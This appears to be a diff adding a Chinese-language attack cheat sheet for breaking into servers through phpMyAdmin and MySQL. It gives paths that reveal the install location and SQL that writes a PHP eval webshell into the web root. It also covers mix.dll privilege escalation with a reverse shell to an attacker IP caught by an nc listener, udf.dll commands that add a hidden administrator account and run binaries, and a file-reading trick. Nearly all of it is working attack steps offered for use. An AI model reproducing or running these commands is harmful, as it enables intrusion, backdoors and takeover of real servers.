@@ -1,0 +1,33 @@
+1:phpmyadmin 后台拿webshell
+phpmyadmin爆路径方法:
+weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
+http://url/phpmyadmin/libraries/select_lang.lib.php 
+pphpmyadmin/libraries/export/xls.php 
+hpmyadmin\themes\darkblue_orange\layout.inc.php 
+
+D:\usr\www\html\phpMyAdmin\
+----start code---
+Create TABLE a (cmd text NOT NULL);
+Insert INTO a (cmd) VALUES('<?php @eval($_POST[cmd])?>');
+select cmd from a into outfile 'C:\wamp\www\d.php';
+Drop TABLE IF EXISTS a;
+----end code---
+
+2:mix.dll提权
+D:/usr/www/html/mix.dll
+mysql -h 目标ip -uroot -p
+\. c:\mysql.txt
+select Mixconnect('反弹ip','端口');
+nc -vv -l -p 1983
+
+3:udf.dll提权
+create function cmdshell returns string soname 'udf.dll'
+select cmdshell('net user user password /add'); 
+select cmdshell('net localgroup administrators user /add'); 
+select cmdshell('c:\3389.exe'); 
+drop function cmdshell;  删除函数
+select cmdshell('netstat -an');
+
+
+load data infile "d:\\www\\gb\\about\\about.htm" into table tmp;
+判断文件存不存在mysql的语句
